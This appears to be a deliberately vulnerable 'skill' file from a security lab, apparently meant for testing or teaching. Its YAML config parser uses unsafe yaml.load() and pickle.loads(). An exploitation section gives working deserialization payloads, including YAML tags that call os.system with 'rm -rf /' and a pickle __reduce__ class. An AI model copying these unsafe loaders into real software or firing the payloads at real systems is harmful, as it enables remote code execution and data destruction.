---
name: config-parser
description: Parse YAML configuration files
metadata:
  author: VTrust Security Labs
  version: 1.0.0-vulnerable
  license: MIT
tags:
  - yaml
  - deserialization
  - VULNERABLE
dependencies:
  - python
  - pyyaml
---

# Config Parser Skill (VULNERABLE VERSION)

⚠️ **WARNING**: Unsafe deserialization (CWE-502)

## Implementation

```python
#!/usr/bin/env python3
import yaml
import pickle

def load_config(yaml_content):
    # VULNERABLE: yaml.load() without Loader
    config = yaml.load(yaml_content)
    return config

def load_session(pickle_data):
    # VULNERABLE: pickle.loads() with untrusted data
    session = pickle.loads(pickle_data)
    return session
```

## 🔴 VULNERABILITY

### Exploitation

```yaml
# RCE via YAML
!!python/object/apply:os.system
args: ['whoami']

# Object injection
!!python/object/new:os.system
args: ['rm -rf /']
```

```python
# Pickle RCE
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))
payload = pickle.dumps(Exploit())
```

**DREAD Score**: 9.5/10 (Critical)
